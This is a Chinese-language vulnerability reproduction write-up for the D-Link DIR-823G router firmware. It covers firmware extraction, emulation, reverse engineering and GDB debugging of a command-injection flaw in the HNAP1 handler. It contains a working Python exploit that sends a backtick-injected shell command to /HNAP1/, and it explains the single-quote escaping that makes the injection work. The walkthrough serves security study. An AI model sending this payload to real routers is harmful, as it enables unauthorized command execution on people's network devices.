# dir823g


# 1、信息收集

## 1.1、基础信息收集
### binwalk

```
binwalk DIR823G_V1.0.2B05_20181207.bin
```
![](vx_images/525441556132812.png)

我们看到这个文件是Squashfs文件系统。



对文件进行解包
```
binwalk -Me DIR823G_V1.0.2B05_20181207.bin
```


![](vx_images/439523477462623.png)

### file&checksec

![](vx_images/348722915708890.png)


我们发现这个固件是mips小端32位


### firmwalker
![](vx_images/336025297981105.png)


这个固件的web服务有两个。

## 1.2、web服务的启动分析
我们先看inittab

```
# Boot-time system configuration/initialization script.
::sysinit:/etc/init.d/rcS  # 启动时执行的初始化脚本，路径是 /etc/init.d/rcS。

# Start an "askfirst" shell on the console (whatever that may be)
#::askfirst:-/bin/sh  # 如果启用，会在控制台启动一个交互式 shell，等待用户输入。

::respawn:-/bin/sh  # 启动一个 shell，若其退出，自动重启这个 shell。

# Start an "askfirst" shell on /dev/tty2-4
#tty2::askfirst:-/bin/sh  # 在 tty2 终端启动交互式 shell（当前被注释，不会执行）。
#tty3::askfirst:-/bin/sh  # 在 tty3 终端启动交互式 shell（当前被注释，不会执行）。
#tty4::askfirst:-/bin/sh  # 在 tty4 终端启动交互式 shell（当前被注释，不会执行）。
```
我们发现这里面启动了rcS文件

我们继续看rcS文件
![](vx_images/114894979363507.png)


这个固件启动的是goahead服务



# 2、漏洞复现


## 2.1、模拟固件

### firmAE
```
sudo ./run.sh -d dlink ./firmwares/dir/dir823g/DIR823G_V1.0.2B05_20181207.bin
```

![](vx_images/62455008806919.png)


## 2.2、漏洞的复现

根据已有的exp寻找漏洞的利用点和利用链。
```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests


IP='192.168.0.1'

#输入要执行的命令
command = "'`cat /flag > /web_mtn/flag.txt`'"
length = len(command)

#构造报文的头部
headers = requests.utils.default_headers()
headers["Content-Length"]=str(length)
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/GetClientInfo"'
headers["Content-Type"] = "text/xml; charset=UTF-8"
headers["Accept"]="*/*"
headers["Accept-Encoding"]="gzip, deflate"
headers["Accept-Language"]="zh-CN,zh;q=0.9,en;q=0.8"

#发送攻击payload
payload = command
r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
```

我们可以看到，这个漏洞的类型是属于命令执行。


首先，我们要定位该命令执行的的调用链。
我们看到这个exp的访问页面位：http://192.168.0.1/HNAP1/

我们拿到这个关键字“HNAP1”，先访问一下看看
![](vx_images/128282771846139.png)

![](vx_images/405141340759227.png)


我们配合着抓包来看，发现这个的页面的信息是一些返回的配置信息。

我们再到固件中进行寻找。
```
grep -ir "HNAP1"
```
![](vx_images/453923385152849.png)

我们发现跟我们“HNAP1”相关的只有这两个.js文件，
我们对下面的那个.js文件进行了查阅，发现它说只是用来通信获取信息的，

![](vx_images/227713363822119.png)

结合着实际的抓包来看
![](vx_images/465624276051175.png)



我们再对另一个.js文件进行检索

```
grep -ir "hnap.js"
```
![](vx_images/250496188788806.png)


![](vx_images/22487022637497.png)
我们查看了initialJS.js的源码后发现，唯一和hnap.js相关的一句还是被注释掉的。

我们继续看另一个文件Wizard.html

![](vx_images/408117052971603.png)


这个页面存在于我们刚模拟启动好的时候，是一个关于路由器所有配置的设置信息。
![](vx_images/385589353362003.png)


初步断定应该是设置配置信息时造成的命令执行漏洞。

到我们配置好所有信息时，登陆进去时，在访问这个界面是访问不到的（就是不会出现这个界面），但是抓包发现，虽然访问没有页面，但是请求包是发送成功的。


我们现在IDA上定位这个命令执行的地方。

![](vx_images/427545501049762.png)
![](vx_images/41442393461015.png)


我们对函数sub_40B1F4和sub_42383C进行查看
在ghidra上看伪代码
sub_40B1F4（ghidra和ida的函数命名前缀不同）
![](vx_images/468601967091053.png)

sub_42383C
![](vx_images/494313051266676.png)

我们发现了命令执行的位置。

我们通过gdb调试验证一下。
![](vx_images/33186086978851.png)

我们把命令改一下。

然后在ghidrau确认这个函数的地址“0042383c”
![](vx_images/132343118875588.png)


然后确认这个命令执行的地址“00423a0c”

![](vx_images/265952745613940.png)


然后设置断点，写一个mygdb.gdb

![](vx_images/245774320305588.png)

```
set architecture mips
set endian little
set sysroot lib/
set solib-search-path lib/
target remote 192.168.0.1:1337
# 命令执行函数的开始地址
b *0x0042383C
# 命令执行的地址
b *0x00423A0C
```
### firmAE&GDB动态调试

在firmAE模拟起来后
![](vx_images/189296561077533.png)
![](vx_images/431764930209296.png)


![](vx_images/347347146169154.png)



```
gdb-multiarch -x mygdb.gdb
```
![](vx_images/69276057526483.png)





然后我们运行我们的exp

![](vx_images/427225239995080.png)



![](vx_images/518814133808835.png)


我们发现我们的命令已经入栈

然后我们继续运行到system函数
![](vx_images/215154177134173.png)




检查一下我们的命令是否执行成功

![](vx_images/345265256111545.png)


我们发现是创建成功的



根据这个exp在burp上发包

![](vx_images/198201697579240.png)



执行是是成功的

![](vx_images/583724378938708.png)








# 3、关于一些细节的补充


## 关于命令的构造：
这个命令需要加个单引号，是因为原拼接里面有单引号
![](vx_images/525288862367854.png)

所以需要单引号去让原本的单引号失效。



